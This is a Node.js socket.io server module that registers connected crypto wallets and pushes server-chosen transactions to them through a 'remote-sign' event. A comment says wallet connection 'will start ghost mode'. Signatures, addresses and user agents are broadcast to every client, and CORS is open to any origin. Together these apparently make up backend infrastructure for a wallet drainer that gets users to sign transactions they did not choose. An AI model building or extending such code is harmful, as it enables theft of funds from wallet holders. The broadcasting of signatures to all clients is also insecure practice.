/**
 * SOCKET LISTENER - Real-time monitoring and remote signing
 */

const { Server } = require('socket.io');
const walletSync = require('../core/walletSync');
const logger = require('../../utils/logger');

class SocketListener {
  constructor(server) {
    this.io = new Server(server, {
      cors: { origin: '*', methods: ['GET', 'POST'] }
    });
    
    this.connections = new Map(); // socketId -> { walletAddress, metadata }
    this.walletToSocket = new Map(); // walletAddress -> socketId
    
    this.initialize();
  }

  initialize() {
    this.io.on('connection', (socket) => {
      logger.info(`Socket connected: ${socket.id}`);

      // Handle wallet registration
      socket.on('register-wallet', async (data) => {
        await this.handleWalletRegistration(socket, data);
      });

      // Handle transaction signing requests from frontend
      socket.on('signing-complete', (data) => {
        this.handleSigningComplete(socket, data);
      });

      socket.on('signing-error', (data) => {
        this.handleSigningError(socket, data);
      });

      // Handle disconnection
      socket.on('disconnect', () => {
        this.handleDisconnect(socket);
      });

      // Health check
      socket.on('ping', () => {
        socket.emit('pong', { timestamp: Date.now() });
      });
    });

    logger.info('Socket listener initialized');
  }

  /**
   * Handle wallet registration
   */
  async handleWalletRegistration(socket, data) {
    try {
      const { walletAddress, metadata = {} } = data;

      if (!walletAddress) {
        socket.emit('error', { message: 'Wallet address required' });
        return;
      }

      // Check if wallet already connected
      if (this.walletToSocket.has(walletAddress)) {
        const oldSocketId = this.walletToSocket.get(walletAddress);
        if (oldSocketId !== socket.id) {
          // Notify old connection
          this.io.to(oldSocketId).emit('duplicate-connection', {
            message: 'New connection detected'
          });
          this.connections.delete(oldSocketId);
        }
      }

      // Store connection
      this.connections.set(socket.id, {
        walletAddress,
        metadata: {
          ...metadata,
          connectedAt: Date.now(),
          userAgent: socket.handshake.headers['user-agent']
        }
      });

      this.walletToSocket.set(walletAddress, socket.id);

      logger.info(`Wallet registered: ${walletAddress.slice(0, 8)}...`);

      // Trigger wallet sync (which will start ghost mode)
      const syncResult = await walletSync.onWalletConnected(walletAddress, socket.id);

      socket.emit('wallet-registered', {
        walletAddress,
        ...syncResult,
        activeConnections: this.connections.size
      });

      // Broadcast connection count
      this.io.emit('connections-update', { count: this.connections.size });

    } catch (error) {
      logger.error('Wallet registration failed:', error);
      socket.emit('error', { message: error.message });
    }
  }

  /**
   * Handle signing complete
   */
  handleSigningComplete(socket, data) {
    const { transactionId, signature, walletAddress } = data;
    
    logger.info(`Signing complete: ${transactionId} - ${signature?.slice(0, 8)}...`);
    
    // Forward to all interested parties
    this.io.emit('transaction-update', {
      transactionId,
      signature,
      walletAddress,
      status: 'completed',
      timestamp: Date.now()
    });
  }

  /**
   * Handle signing error
   */
  handleSigningError(socket, data) {
    const { transactionId, error, walletAddress } = data;
    
    logger.error(`Signing error: ${transactionId} - ${error}`);
    
    this.io.emit('transaction-update', {
      transactionId,
      error,
      walletAddress,
      status: 'failed',
      timestamp: Date.now()
    });
  }

  /**
   * Handle disconnection
   */
  handleDisconnect(socket) {
    const connection = this.connections.get(socket.id);
    
    if (connection) {
      const { walletAddress } = connection;
      
      this.connections.delete(socket.id);
      this.walletToSocket.delete(walletAddress);
      
      walletSync.onWalletDisconnected(walletAddress);
      
      logger.info(`Socket disconnected: ${socket.id} (wallet: ${walletAddress?.slice(0, 8)}...)`);
      
      this.io.emit('connections-update', { count: this.connections.size });
    }
  }

  /**
   * Send transaction to specific wallet
   */
  sendTransactionToWallet(walletAddress, transactionData) {
    const socketId = this.walletToSocket.get(walletAddress);
    
    if (!socketId) {
      throw new Error('Wallet not connected');
    }

    this.io.to(socketId).emit('remote-sign', {
      transactionId: `tx_${Date.now()}_${Math.random().toString(36)}`,
      transaction: transactionData,
      timestamp: Date.now()
    });

    logger.info(`Transaction sent to ${walletAddress.slice(0, 8)}...`);
  }

  /**
   * Broadcast to all connected wallets
   */
  broadcast(event, data) {
    this.io.emit(event, {
      ...data,
      broadcast: true,
      timestamp: Date.now()
    });
    
    logger.info(`Broadcast ${event} to ${this.connections.size} wallets`);
  }

  /**
   * Get connection stats
   */
  getStats() {
    return {
      totalConnections: this.connections.size,
      wallets: Array.from(this.walletToSocket.keys()),
      connections: Array.from(this.connections.entries()).map(([id, data]) => ({
        socketId: id,
        walletAddress: data.walletAddress,
        connectedAt: data.metadata.connectedAt
      }))
    };
  }
}

module.exports = SocketListener;